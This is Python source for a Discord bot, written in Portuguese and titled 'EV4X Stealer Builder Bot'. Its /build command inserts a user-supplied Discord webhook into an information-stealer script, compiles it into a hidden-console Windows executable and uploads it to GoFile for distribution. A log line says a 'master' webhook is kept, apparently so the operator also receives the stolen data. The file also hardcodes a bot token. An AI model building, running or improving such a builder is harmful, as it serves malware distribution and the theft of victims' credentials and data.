import discord
from discord import app_commands
import os
import subprocess
import shutil
import uuid
import requests
import time
from pathlib import Path

# Configurações
import os
TOKEN = os.getenv('TOKEN', 'MTUxMTA4Mjg4NDM4NjAwMTE5OQ.GZG9-M.O0lXJywjl6_ug-s-eXbjLkIUR6gMJ0AxGHVIi4')
GUILD_ID = None  # Deixe None para comandos globais, ou coloque o ID do servidor

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

BASE_DIR = Path(__file__).parent
BUILD_DIR = BASE_DIR / 'builds'
BUILD_DIR.mkdir(exist_ok=True)

def upload_to_gofile(filepath):
    """Faz upload para GoFile"""
    try:
        print(f"[*] Fazendo upload para GoFile...")
        
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f, 'application/octet-stream')}
            response = requests.post(
                'https://upload.gofile.io/uploadfile',
                files=files,
                timeout=300
            )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'ok':
                return data['data']['downloadPage'], None
        
        return None, "Erro no upload"
    except Exception as e:
        return None, str(e)

@client.event
async def on_ready():
    try:
        if GUILD_ID:
            guild = discord.Object(id=GUILD_ID)
            tree.copy_global_to(guild=guild)
            await tree.sync(guild=guild)
        else:
            await tree.sync()
        
        print(f'✅ Bot online como {client.user}')
        print(f'📋 Comandos registrados!')
    except Exception as e:
        print(f'❌ Erro ao sincronizar comandos: {e}')

@tree.command(name="build", description="Gera um executável personalizado do stealer")
@app_commands.describe(
    nome="Nome do executável (sem espaços)",
    webhook="URL do webhook do Discord onde os dados serão enviados"
)
async def build_command(interaction: discord.Interaction, nome: str, webhook: str):
    await interaction.response.defer(thinking=True)
    
    try:
        # Validações
        if not webhook.startswith('https://discord'):
            await interaction.followup.send("❌ Webhook inválido! Use um webhook do Discord.")
            return
        
        # Remove caracteres inválidos
        exe_name = "".join(c for c in nome if c.isalnum() or c in ('_', '-'))
        if not exe_name:
            exe_name = 'stealer'
        
        await interaction.followup.send(f"⚙️ Gerando `{exe_name}.exe`...\nIsso pode levar alguns minutos.")
        
        # Cria diretório temporário
        build_id = str(uuid.uuid4())[:8]
        build_path = BUILD_DIR / build_id
        build_path.mkdir(exist_ok=True)
        
        # Copia e modifica o ev4x.py
        source_file = BASE_DIR / 'ev4x.py'
        target_file = build_path / 'ev4x.py'
        
        with open(source_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Substitui os webhooks
        print(f"[*] Configurando webhooks...")
        print(f"[*] Master webhook: mantido (Pastebin)")
        print(f"[*] User webhook: {webhook}")
        
        content = content.replace(
            'USER_WEBHOOK = ""',
            f'USER_WEBHOOK = "{webhook}"'
        )
        
        # Verifica se a substituição funcionou
        if f'USER_WEBHOOK = "{webhook}"' not in content:
            print("[!] AVISO: Webhook do usuário não foi substituído!")
        else:
            print("[+] Webhooks configurados com sucesso!")
        
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        # Cria .spec
        spec_content = f"""# -*- mode: python ; coding: utf-8 -*-

a = Analysis(
    ['ev4x.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['Crypto.Cipher.AES'],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{exe_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
"""
        
        spec_file = build_path / f'{exe_name}.spec'
        with open(spec_file, 'w', encoding='utf-8') as f:
            f.write(spec_content)
        
        # Compila
        print(f"[*] Compilando {exe_name}...")
        result = subprocess.run(
            ['pyinstaller', '--clean', '--noconfirm', str(spec_file)],
            cwd=build_path,
            capture_output=True,
            text=True,
            timeout=300
        )
        
        if result.returncode != 0:
            await interaction.followup.send(f"❌ Erro ao compilar:\n```{result.stderr[:1000]}```")
            shutil.rmtree(build_path)
            return
        
        # Verifica executável
        exe_file = build_path / 'dist' / f'{exe_name}.exe'
        if not exe_file.exists():
            await interaction.followup.send("❌ Executável não foi gerado.")
            shutil.rmtree(build_path)
            return
        
        # Move executável
        final_exe = BUILD_DIR / f'{exe_name}_{build_id}.exe'
        shutil.move(str(exe_file), str(final_exe))
        
        file_size_mb = os.path.getsize(final_exe) / (1024 * 1024)
        
        # Upload para GoFile
        await interaction.followup.send(f"📤 Fazendo upload para GoFile...")
        gofile_link, error = upload_to_gofile(str(final_exe))
        
        # Limpa
        shutil.rmtree(build_path)
        os.remove(final_exe)
        
        if not gofile_link:
            await interaction.followup.send(f"❌ Erro no upload: {error}")
            return
        
        # Envia link de download APENAS para o webhook do usuário
        # (não envia notificação de build, só o link quando solicitado)
        # A notificação de build vai apenas para o Discord
        
        # Resposta final
        embed = discord.Embed(
            title="✅ Build Concluído!",
            description=f"Executável **{exe_name}.exe** gerado com sucesso!",
            color=discord.Color.green()
        )
        embed.add_field(name="📊 Tamanho", value=f"{file_size_mb:.2f} MB", inline=True)
        embed.add_field(name="📥 Download", value=f"[GoFile]({gofile_link})", inline=True)
        embed.set_footer(text="O link também foi enviado para seu webhook!")
        
        await interaction.followup.send(embed=embed)
        
    except subprocess.TimeoutExpired:
        await interaction.followup.send("❌ Timeout: Build demorou muito tempo.")
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@tree.command(name="help", description="Mostra como usar o bot")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔥 EV4X Stealer Builder Bot",
        description="Bot para gerar executáveis personalizados do stealer",
        color=discord.Color.red()
    )
    
    embed.add_field(
        name="📋 Comandos",
        value="`/build` - Gera um executável personalizado\n`/help` - Mostra esta mensagem",
        inline=False
    )
    
    embed.add_field(
        name="🚀 Como usar",
        value="1. Use `/build nome:MeuStealer webhook:https://...`\n2. Aguarde a compilação (2-5 minutos)\n3. Baixe pelo link do GoFile!",
        inline=False
    )
    
    embed.add_field(
        name="⚠️ Importante",
        value="• O webhook deve ser do Discord\n• O nome não pode ter espaços\n• O build pode demorar alguns minutos",
        inline=False
    )
    
    embed.set_footer(text="EV4X Stealer Builder")
    
    await interaction.response.send_message(embed=embed)

if __name__ == "__main__":
    if TOKEN == "SEU_TOKEN_AQUI":
        print("❌ Configure o TOKEN do bot no arquivo bot.py!")
    else:
        client.run(TOKEN)
